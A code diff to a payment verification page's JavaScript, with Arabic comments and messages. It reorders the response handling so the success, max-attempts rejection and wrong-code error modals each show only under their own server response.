@@ -777,26 +777,30 @@
       .then(data => {
         console.log('استجابة السيرفر:', data);
         
-        // === Max attempts reached: redirect to rejection page ===
-        showModal(
-          locales[currentLang].modalTitleRejected || 'تم رفض الطلب',
-          locales[currentLang].msgMaxAttempts || 'تم رفض طلبك، يرجى استخدام طريقة دفع أخرى',
-          'error',
-          'success.html?rejected=true'
-        );
-        return;
-        
-        // === جديد: إذا success=true → نجاح وتوجيه ===
+        // === إذا success=true → نجاح وتوجيه ===
         if (data.success === true) {
-          showMessage('success', locales[currentLang].msgSuccess);
-          setTimeout(() => {
-            window.location.href = 'success.html';
-          }, 1500);
+          showModal(
+            'تم تأكيد الدفع',
+            locales[currentLang].msgSuccess || 'تم التحقق من الرمز بنجاح',
+            'success',
+            'success.html'
+          );
           return;
         }
         
-        // === Error state: show modal ===
-        let errorTitle = locales[currentLang].modalTitleError || 'خطأ في التحقق';
+        // === Max attempts reached: redirect to rejection page ===
+        if (data.message === 'max_attempts') {
+          showModal(
+            locales[currentLang].modalTitleRejected || 'تم رفض الطلب',
+            locales[currentLang].msgMaxAttempts || 'تم رفض طلبك، يرجى استخدام طريقة دفع أخرى',
+            'error',
+            'success.html?rejected=true'
+          );
+          return;
+        }
+        
+        // === Error state: show modal (رمز خاطئ) ===
+        let errorTitle = locales[currentLang].modalTitleError || 'خطأ في الرمز';
         let errorMsg = locales[currentLang].msgError;
         
         if (data.attempt && data.attempt >= 2) {
